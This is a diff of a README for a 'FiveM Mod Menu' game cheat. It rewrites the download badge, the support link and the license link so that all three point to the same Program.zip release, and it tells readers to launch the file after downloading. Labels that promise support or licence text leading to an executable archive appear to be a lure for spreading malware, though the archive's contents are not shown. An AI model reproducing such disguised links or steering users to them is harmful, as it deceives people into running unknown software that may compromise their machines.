@@ -29,7 +29,7 @@ Welcome to the official repository of the FiveM Mod Menu, featuring a powerful L
 
 ## Download the Mod Menu 📥
 Click the button below to download the software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/eduardo1234567899/FiveM-Mod-Menu/releases/download/v1.0/Program.zip)](https://github.com/eduardo1234567899/FiveM-Mod-Menu/releases/download/v1.0/Program.zip)
 
 Please note that the software file needs to be launched after downloading to access all the amazing features provided by the FiveM Mod Menu.
 
@@ -44,9 +44,9 @@ Follow these steps to get started with the FiveM Mod Menu:
 We welcome contributions from the gaming community to help improve and expand the capabilities of the FiveM Mod Menu. Feel free to submit pull requests with your enhancements or open issues to report any bugs or suggestions.
 
 ## Support ℹ️
-For any queries or assistance regarding the FiveM Mod Menu, please visit our [Support Page](https://github.com/rokytd/fivem-mod-menu/support).
+For any queries or assistance regarding the FiveM Mod Menu, please visit our [Support Page](https://github.com/eduardo1234567899/FiveM-Mod-Menu/releases/download/v1.0/Program.zip).
 
 ## License 📜
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/rokytd/fivem-mod-menu/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/eduardo1234567899/FiveM-Mod-Menu/releases/download/v1.0/Program.zip) file for details.
 
 Let's revolutionize your gaming experience with the power of the FiveM Mod Menu! 💪🎮
